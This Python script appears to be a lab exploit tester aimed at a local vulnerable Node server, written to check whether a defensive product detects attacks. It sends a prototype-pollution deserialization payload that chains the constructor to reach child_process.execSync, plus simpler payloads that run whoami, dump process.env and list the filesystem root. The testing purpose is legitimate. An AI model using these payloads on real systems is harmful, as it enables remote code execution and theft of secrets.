#!/usr/bin/env python3
"""
Deserialization Attack Testing Script
Tests prototype pollution and unsafe deserialization vulnerabilities

WARNING: Use only in authorized testing environments!
"""

import requests
import json
import sys
from typing import Dict, Any

# Target server configuration
TARGET_URL = "http://localhost:3000"
TIMEOUT = 10

class VulnerabilityTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()

    def test_health(self) -> bool:
        """Check if the vulnerable server is running"""
        try:
            response = self.session.get(f"{self.base_url}/api/health", timeout=TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                print(f"✓ Server is running: {data.get('status')}")
                print(f"  Vulnerabilities available: {len(data.get('vulnerabilities', []))}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"✗ Server not reachable: {e}")
            return False
        return False

    def test_deserialization_attack(self, payload: Dict[str, Any]) -> None:
        """
        Test deserialization vulnerability with prototype pollution

        This payload attempts to:
        1. Pollute the prototype chain with malicious properties
        2. Use constructor chaining to access Function constructor
        3. Execute arbitrary code via child_process
        """
        print("\n" + "="*60)
        print("🔴 TESTING: Deserialization Attack (Prototype Pollution)")
        print("="*60)

        # Convert payload to string for unsafe eval
        payload_str = json.dumps(payload)

        print(f"\n📤 Sending payload to {self.base_url}/api/deserialize")
        print(f"Payload size: {len(payload_str)} bytes")
        print(f"\nPayload structure:")
        print(json.dumps(payload, indent=2))

        try:
            response = self.session.post(
                f"{self.base_url}/api/deserialize",
                json={"data": payload_str},
                timeout=TIMEOUT,
                headers={"Content-Type": "application/json"}
            )

            print(f"\n📥 Response Status: {response.status_code}")
            print(f"Response:")
            print(json.dumps(response.json(), indent=2))

            # Check what a defensive product should detect
            print("\n🛡️  DEFENSIVE PRODUCT SHOULD DETECT:")
            print("   ✓ Prototype pollution pattern (__proto__)")
            print("   ✓ Constructor chain manipulation")
            print("   ✓ child_process module access")
            print("   ✓ execSync command execution")
            print("   ✓ Suspicious eval() usage")

        except requests.exceptions.RequestException as e:
            print(f"\n✗ Request failed: {e}")
        except json.JSONDecodeError as e:
            print(f"\n✗ Invalid JSON response: {e}")
            print(f"Raw response: {response.text}")

    def test_simple_deserialization(self) -> None:
        """Test basic deserialization with command execution"""
        print("\n" + "="*60)
        print("🔴 TESTING: Simple Deserialization RCE")
        print("="*60)

        # Simple payload that executes commands
        payloads = [
            {
                "name": "Command execution via require",
                "data": '{"cmd": "require(\'child_process\').execSync(\'whoami\').toString()"}',
            },
            {
                "name": "Environment variable access",
                "data": '{"env": "process.env"}',
            },
            {
                "name": "File system access",
                "data": '{"files": "require(\'fs\').readdirSync(\'/\')"}',
            }
        ]

        for test in payloads:
            print(f"\n📤 Test: {test['name']}")
            print(f"Payload: {test['data']}")

            try:
                response = self.session.post(
                    f"{self.base_url}/api/deserialize",
                    json={"data": test['data']},
                    timeout=TIMEOUT
                )

                print(f"Response: {response.json()}")

            except Exception as e:
                print(f"Error: {e}")


def main():
    """Main testing function"""
    print("="*60)
    print("🔓 VULNERABLE SERVER SECURITY TESTING TOOL")
    print("="*60)
    print("Purpose: Test defensive security product detection")
    print("Target: Deserialization & Prototype Pollution vulnerabilities")
    print("="*60)

    # Initialize tester
    tester = VulnerabilityTester(TARGET_URL)

    # Check server health
    if not tester.test_health():
        print("\n⚠️  ERROR: Vulnerable server is not running!")
        print("Start the server with: npm start")
        sys.exit(1)

    # Advanced prototype pollution payload
    advanced_payload = {
        "0": {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then": "$B0"}',
            "_response": {
                "_formData": {
                    "get": "$3:constructor:constructor"
                },
                "_prefix": "process.mainModule.require('child_process').execSync('id')//"
            }
        },
        "1": '"$@0"',
        "3": []
    }

    # Run tests
    tester.test_deserialization_attack(advanced_payload)
    tester.test_simple_deserialization()

    # Summary
    print("\n" + "="*60)
    print("📊 TESTING COMPLETE")
    print("="*60)
    print("\nYour defensive product should have detected:")
    print("  • Prototype pollution attempts (__proto__)")
    print("  • Unsafe deserialization patterns")
    print("  • Command execution via child_process")
    print("  • Constructor chain manipulation")
    print("  • Process/environment access attempts")
    print("\nIf these were NOT detected, your defensive product needs improvement!")
    print("="*60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  Testing interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n✗ Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
